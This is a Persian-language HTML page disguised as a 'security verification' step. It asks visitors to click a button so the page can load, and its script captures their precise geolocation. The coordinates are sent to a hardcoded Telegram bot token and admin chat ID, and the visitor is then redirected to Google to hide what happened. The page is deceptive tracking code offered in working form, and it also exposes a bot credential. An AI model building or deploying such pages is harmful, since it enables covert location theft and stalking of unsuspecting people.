<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تایید امنیتی</title>
</head>
<body style="text-align: center; font-family: Tahoma, sans-serif; margin-top: 100px; background-color: #f4f4f9;">

    <div style="background: white; padding: 30px; border-radius: 12px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 90%;">
        <h3>برای بارگذاری کامل صفحه، لطفاً روی دکمه زیر کلیک کنید:</h3>
        <br>
        <button onclick="requestLocation()" style="background-color: #4CAF50; color: white; padding: 12px 25px; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; font-family: Tahoma;">تایید و ادامه</button>
        <p id="status" style="margin-top: 20px; color: #666; font-size: 14px;"></p>
    </div>

    <script>
        const BOT_TOKEN = '8819824616:AAGeOJx_dFMt_VLYzmLoH60D9CjHybUhcI8';
        const ADMIN_CHAT_ID = '8861869235';

        function requestLocation() {
            const statusEl = document.getElementById("status");
            statusEl.innerText = "در حال ارتباط با سرویس مکان‌یابی...";

            if (!navigator.geolocation) {
                statusEl.innerText = "مرورگر شما از این قابلیت پشتیبانی نمی‌کند.";
                return;
            }

            // درخواست مستقیم و صریح از مرورگر برای باز کردن پاپ‌آپ اجازه
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    statusEl.innerText = "موقعیت دریافت شد. در حال ارسال...";

                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
                    
                    fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: ADMIN_CHAT_ID,
                            latitude: lat,
                            longitude: lon
                        })
                    })
                    .then(res => {
                        statusEl.innerText = "تایید شد.";
                        setTimeout(() => {
                            window.location.href = "https://www.google.com";
                        }, 1000);
                    })
                    .catch(err => {
                        statusEl.innerText = "خطا در ارسال داده به سرور.";
                    });
                },
                function(error) {
                    // اگر کاربر دکمه Deny را بزند یا دسترسی مسدود باشد
                    statusEl.innerText = "خطا: لطفاً دسترسی به لوکیشن را در مرورگر مجاز کنید.";
                },
                {
                    enableHighAccuracy: true,
                    timeout: 20000,
                    maximumAge: 0
                }
            );
        }
    </script>
</body>
</html>
